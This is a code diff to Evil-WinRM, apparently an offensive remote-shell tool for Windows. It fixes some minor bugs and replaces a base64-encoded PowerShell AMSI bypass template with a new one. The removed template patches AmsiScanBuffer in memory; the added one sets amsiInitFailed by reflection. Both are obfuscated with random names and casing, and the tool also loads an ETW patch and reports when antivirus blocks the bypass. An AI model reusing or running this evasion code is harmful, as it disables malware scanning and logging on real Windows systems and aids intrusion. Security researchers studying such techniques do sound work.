@@ -37,7 +37,7 @@ TYPE_SUCCESS = 4
 # Available commands
 $LIST = %w[Bypass-4MSI services upload download clear cls menu exit quit]
 $COMMANDS = $LIST.dup
-$CMDS = $COMMANDS.clone
+$CMDS = ['Bypass-4MSI', 'services', 'upload', 'download', 'clear / cls', 'menu', 'exit / quit']
 $LISTASSEM = [''].sort
 $DONUTPARAM1 = ['-process_id']
 $DONUTPARAM2 = ['-donutfile']
@@ -168,7 +168,7 @@ module WinRM
               out = _write_file(fd, output)
               index += out.length
             end
-          rescue EstandardError => err
+          rescue StandardError => err
             @logger.debug("IO Failed: " + err.to_s)
             raise
           end
@@ -1812,10 +1812,9 @@ class EvilWinRM
                 puts
                 output = shell.run($MENU_CMD)
                 autocomplete = output.output || ""
-                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
-                autocomplete = autocomplete || ""
+                autocomplete = autocomplete.gsub(/\r\n?/, "\n")
                 assemblyautocomplete = shell.run($SHOW_GLOBAL_METHODS_CMD).output.chomp
-                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
+                assemblyautocomplete = assemblyautocomplete.gsub(/\r\n?/, "\n")
                 unless assemblyautocomplete.to_s.empty?
                   $LISTASSEMNOW = assemblyautocomplete.split("\n")
                   $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
@@ -1840,9 +1839,9 @@ class EvilWinRM
                 sleep(timeToWait)
               end
               unless @Bypass_4MSI_loaded
-                load_Bypass_4MSI(shell)
-                load_ETW_patch(shell)
-                @Bypass_4MSI_loaded = true
+                if load_Bypass_4MSI(shell) && load_ETW_patch(shell)
+                  @Bypass_4MSI_loaded = true
+                end
               end
             elsif command.start_with?('ai:')
               if has_llm_params
@@ -2091,7 +2090,7 @@ class EvilWinRM
   end
 
   def get_Bypass_4MSI
-    bypass_template = 'ZnVuY3Rpb24gPj48RlVOQ1RJT04xPj48IHsKICAgIFBhcmFtICg+PjxWQVIxPj48LCA+PjxWQVIyPj48KQogICAgPj48VkFSMz4+PCA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgV2hlcmUtT2JqZWN0IHsgCiAgICAgICAgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCIiKzw+PFw8PjwrIiIpWy0xXS5FcXVhbHMoIiIrPD48U3lzdGVtLmRsbDw+PCsiIikKICAgICB9KS5HZXRUeXBlKCJNaWNyb3NvZnQuIis8PjxXaW4zMi5Vbjw+PCsic2FmZU5hdGl2ZU1ldGhvZHMiKQogICAgPj48VkFSND4+PD1AKCkKICAgID4+PFZBUjM+PjwuR2V0TWV0aG9kcygpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIElmKCRfLk5hbWUgLWxpa2UgIkdlKlAqb2MqIis8PjxkZHJlczw+PCsicyIpIHsKICAgICAgICAgICAgPj48VkFSND4+PCs9JF8KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gPj48VkFSND4+PFswXS5JbnZva2UoJG51bGwsIEAoKD4+PFZBUjM+PjwuR2V0TWV0aG9kKCIiKzw+PEdldE08PjwrIm9kdWwiKzw+PGVIYW48PjwrImRsZSIpKS5JbnZva2UoJG51bGwsIEAoPj48VkFSMT4+PCkpLCA+PjxWQVIyPj48KSkKfQojanVtcAoKZnVuY3Rpb24gPj48RlVOQ1RJT04yPj48IHsKICAgIFBhcmFtICgKICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSA+PjxWQVI1Pj48LCBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldIFtUeXBlXSA+PjxWQVI2Pj48ID0gW1ZvaWRdCiAgICApCiAgICA+PjxWQVIxMj4+PCA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgKICAgICAgICAoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoIiIrPD48UmVmPD48KyJsZWMiKzw+PHRlZERlPD48KyJsZWdhdGUiKSksCiAgICAgICAgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuCiAgICApLkRlZmluZUR5bmFtaWNNb2R1bGUoCiAgICAgICAgIiIrPD48SW5NPD48KyJlbW8iKzw+PHJ5PD48KyJNb2R1bGUiLAogICAgICAgICRmYWxzZQogICAgKS5EZWZpbmVUeXBlKAogICAgICAgICQoIiIrPD48TXlEZWxlZ2F0ZVR5cGU8PjwrIiIpLAogICAgICAgICJDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzIiwKICAgICAgICBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXQogICAgKQoKICAgID4+PFZBUjEyPj48LkRlZmluZUNvbnN0cnVjdG9yKAogICAgICAgICJSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYyIsCiAgICAgICAgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCA+PjxWQVI1Pj48CiAgICApLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoIlJ1bnRpbWUsIE1hbmFnZWQiKQoKICAgID4+PFZBUjEyPj48LkRlZmluZU1ldGhvZCgKICAgICAgICAiSW52b2tlIiwKICAgICAgICAiUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwiLAogICAgICAgID4+PFZBUjY+PjwsCiAgICAgICAgPj48VkFSNT4+PAogICAgKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCJSdW50aW1lLCBNYW5hZ2VkIikKICAgIAogICAgcmV0dXJuID4+PFZBUjEyPj48LkNyZWF0ZVR5cGUoKQp9CiNqdW1wCltJbnRQdHJdPj48VkFSNz4+PCA9ID4+PEZVTkNUSU9OMT4+PCAkKCIiKzw+PGFtc2kuZGxsPD48KyIiKSAkKCIiKzw+PEFtc2lTY2FuQnVmZmVyPD48KyIiKQojanVtcAo+PjxWQVI4Pj48ID0gMAojanVtcAo+PjxWQVI5Pj48PVtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKAogICAgKD4+PEZVTkNUSU9OMT4+PCAkKCIiKzw+PGtlcm5lbDMyLmRsbDw+PCsiIikgVmlydHVhbFByb3RlY3QpLCAKICAgICg+PjxGVU5DVElPTjI+PjwgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pKQopCiNqdW1wCj4+PFZBUjEwPj48ID0gPj48VkFSOT4+PC5JbnZva2UoPj48VkFSNz4+PCwgMywgMHg0MCwgW3JlZl0+PjxWQVI4Pj48KQojanVtcAo+PjxWQVIxMT4+PCA9IFtCeXRlW11dICgweGI4LDB4MzQsMHgxMiwweDA3LDB4ODAsMHg2NiwweGI4LDB4MzIsMHgwMCwweGIwLDB4NTcsMHhjMykKI2p1bXAKPj48VkFSMTA+PjwgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KD4+PFZBUjExPj48LCAwLCA+PjxWQVI3Pj48LCAxMikKI2p1bXAKUmVtb3ZlLUl0ZW0gRnVuY3Rpb246Pj48RlVOQ1RJT04yPj48CiNqdW1wClJlbW92ZS1JdGVtIEZ1bmN0aW9uOj4+PEZVTkNUSU9OMT4+PA=='
+    bypass_template = 'ZnVuY3Rpb24gPj48RlVOQ1RJT04xPj48IHsKICAgIFBhcmFtICg+PjxWQVIxPj48KQoKICAgID4+PFZBUjI+PjwgPSBbQXBQRG9tYUlOXTo6Y3VyckVOVERvbWFpTi5nZXRhU1NlbUJsaUVTKCkgfAogICAgICAgIFdIRVJlLU9CakVjVCB7ICRfLkxPQ0FUSU9OIC1BbkQgJF8uTG9DYVRpb24uRW5kc3dpVEgoPj48U1RSSU5HMT4+PCkgfQoKICAgID4+PFZBUjM+PjwgPSA+PjxWQVIyPj48LmdFdFRZUEVTKCkgfAogICAgICAgIHdoRXJFLU9iSkVjdCB7ICRfLk5BTWUgLUVxICQoKCd7MH17MX17Mn17M30nIC1GICdBbXNpJywnVScsJ3QnLCdpbHMnKSkgfQoKICAgID4+PFZBUjQ+PjwgPSBbU1lTdGVtLlJFRmxlY3RpT24uYkluRGlOR2ZsQUdTXSdOb25QdWJsaWMsU3RhdGljJwoKICAgID4+PFZBUjU+PjwgPSA+PjxWQVIzPj48LmdldGZJZWxEKCQoKCd7MH17MX17Mn0nIC1mICdhbXMnLCdpSW5pdCcsJ0ZhaWxlZCcpKSwgPj48VkFSMT4+PCkKCiAgICBJZiAoID4+PFZBUjU+PjwgLUVxICRudWxsICkgeyBSZXR1cm4gJEZhbHNlIH0KCiAgICBSZXR1cm4gPj48VkFSNT4+PAp9CiNqdW1wCmZ1bmN0aW9uID4+PEZVTkNUSU9OMj4+PCB7CiAgICBQYXJhbSAoPj48VkFSNj4+PCkKCiAgICBJZiAoID4+PFZBUjY+PjwgLUVxICRudWxsICkgeyBSZXR1cm4gJEZhbHNlIH0KCiAgICA+PjxWQVI2Pj48LnNFVFZhTHVlKCRuVUxMLCAkVHJVRSkKICAgIFJldHVybiAkVHJ1ZQp9CiNqdW1wCj4+PFZBUjc+PjwgPSA+PjxGVU5DVElPTjE+PjwgKFtTWVN0ZW0uUkVGbGVjdGlPbi5iSW5EaU5HZmxBR1NdJ05vblB1YmxpYyxTdGF0aWMnKQojanVtcAo+PjxWQVI4Pj48ID0gPj48RlVOQ1RJT04yPj48ICg+PjxWQVI3Pj48KQojanVtcApSZW1vdmUtSXRlbSBGdW5jdGlvbjo+PjxGVU5DVElPTjE+PjwKI2p1bXAKUmVtb3ZlLUl0ZW0gRnVuY3Rpb246Pj48RlVOQ1RJT04yPj48Cg=='
 
     result = Base64.decode64(bypass_template)
 
@@ -2100,12 +2099,13 @@ class EvilWinRM
       result = replace_func_var_name(result, "FUNCTION#{i}", func_name)
     end
 
-    for i in 1..12
+    for i in 1..8
       var_name = "$#{random_string((7..17).to_a.sample)}"
       result = replace_func_var_name(result, "VAR#{i}", var_name)
     end
 
-    result = replace_with_string_scan(result)
+    result = replace_placeholder_string(result, ">><STRING1>><", "System.Management.Automation.dll")
+
     result = rand_casing_keywords(result)
     result
   end
@@ -2117,7 +2117,7 @@ class EvilWinRM
     thread.join
   end
 
-  def load_powershell(shell, powershell_script, sleep_for = 2)
+  def load_powershell(shell, powershell_script, sleep_for = 2, stop_on_output = false)
     outputs = []
     num_jumps = powershell_script.scan(/#jump/).size + 1
     current_jump = 1
@@ -2127,6 +2127,7 @@ class EvilWinRM
         output = shell.run(item)
         if !output.output.nil? && !output.output.empty? && !output.output.chomp.empty?
           outputs << output.output
+          break if stop_on_output
         end
         current_jump += 1
         wait_for(sleep_for)
@@ -2143,11 +2144,20 @@ class EvilWinRM
   def load_Bypass_4MSI(shell)
     bypass = get_Bypass_4MSI
     print_message('Patching 4MSI, please be patient...', TYPE_INFO, true)
-    outputs = load_powershell(shell, bypass, 2)
+    outputs = load_powershell(shell, bypass, 2, true)
     if outputs.empty?
       print_message('[+] Success!', TYPE_SUCCESS, false)
+      true
     else
-      puts(outputs.join("\n"))
+      error_output = outputs.join("\n")
+      if error_output.match?(/malicious content and has been blocked by your antivirus software/i)
+        print_message('AMSI bypass was detected and blocked by the antivirus', TYPE_ERROR, true)
+      else
+        print_message('AMSI bypass failed', TYPE_ERROR, true)
+      end
+      print_message('Original output:', TYPE_WARNING, false)
+      puts(error_output)
+      false
     end
   end
 
@@ -2161,8 +2171,10 @@ class EvilWinRM
     outputs = load_powershell(shell, result)
     if outputs.empty?
       print_message('[+] Success!', TYPE_SUCCESS, false)
+      true
     else
       puts("Error #{outputs.join("\n")}")
+      false
     end
   end
 
